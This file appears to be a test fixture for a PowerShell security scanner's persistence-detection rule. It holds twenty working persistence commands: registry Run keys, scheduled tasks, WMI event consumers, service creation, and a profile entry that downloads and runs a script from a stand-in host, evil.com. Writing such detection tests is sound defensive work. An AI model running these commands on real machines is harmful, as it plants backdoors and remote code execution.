# PowerShield Test Script: Persistence Mechanism Detection
# This script contains intentional persistence patterns for testing Rule 49
# MITRE ATT&CK: T1547 (Boot or Logon Autostart Execution), T1053 (Scheduled Task), T1546 (Event Triggered Execution)

# Test 1: Registry Run key modification (Critical)
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\malware\evil.exe"

# Test 2: HKCU Run key (Critical)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Persistence" -Value "powershell.exe -w hidden -enc ABC123"

# Test 3: RunOnce key (Critical)
New-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Force
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "Update" -Value "C:\Temp\payload.exe"

# Test 4: User Shell Folders (Critical)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "C:\Evil\Startup"

# Test 5: Scheduled task creation (High)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\Scripts\malicious.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger

# Test 6: New-ScheduledTask (High)
New-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor"

# Test 7: schtasks command (High)
schtasks /create /tn "EvilTask" /tr "C:\malware\payload.exe" /sc onlogon

# Test 8: WMI Event Subscription (Critical)
$filterName = 'ProcessStartEvent'
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.Name = $filterName
$filter.EventNamespace = 'root\cimv2'
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
$filter.Put()

# Test 9: WMI EventConsumer (Critical)
Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'" -Action { Start-Process "C:\evil.exe" }

# Test 10: CommandLineEventConsumer (Critical)
$consumerClass = [wmiclass]"\\.\root\subscription:CommandLineEventConsumer"
$consumer = $consumerClass.CreateInstance()
$consumer.Name = "EvilConsumer"
$consumer.CommandLineTemplate = "C:\backdoor.exe"
$consumer.Put()

# Test 11: PowerShell profile modification (High)
Add-Content -Path $PROFILE -Value "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/load.ps1')"

# Test 12: $profile variable usage (High)
Set-Content -Path $profile -Value "Start-Process C:\malware\backdoor.exe -WindowStyle Hidden"

# Test 13: Startup folder file creation (High)
Copy-Item "C:\malware\evil.exe" "C:\Users\Public\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# Test 14: Startup path reference (High)
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
New-Item -Path "$startupPath\backdoor.lnk" -ItemType File

# Test 15: Windows Service creation (High)
New-Service -Name "EvilService" -BinaryPathName "C:\malware\service.exe" -StartupType Automatic

# Test 16: Set-Service modification (High)
Set-Service -Name "UpdaterService" -StartupType Automatic -Status Running

# Test 17: sc.exe service creation (High)
sc.exe create "BackdoorSvc" binpath= "C:\evil\payload.exe" start= auto

# Test 18: WMI __EventFilter reference (Critical)
$query = "SELECT * FROM __EventFilter WHERE Name='EvilFilter'"
Get-WmiObject -Namespace root\subscription -Query $query

# Test 19: FilterToConsumerBinding (Critical)
$bindingClass = [wmiclass]"\\.\root\subscription:__FilterToConsumerBinding"
$binding = $bindingClass.CreateInstance()

# Test 20: ActiveScriptEventConsumer (Critical)
Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{Name="EvilScript"; ScriptText="CreateObject('WScript.Shell').Run('calc.exe')"}

Write-Host "Persistence mechanism detection test complete"
